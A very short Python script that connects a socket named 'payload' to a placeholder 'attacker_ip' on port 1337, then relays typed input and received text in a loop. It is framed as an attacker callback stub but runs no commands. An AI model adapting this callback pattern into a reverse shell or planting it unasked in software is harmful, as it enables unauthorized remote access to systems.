import socket

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

while True:
	recv = payload.recv(2048)
	print(recv.decode("utf-8"))

	inp = input(">> ")
	payload.send(bytes(inp, "utf-8"))
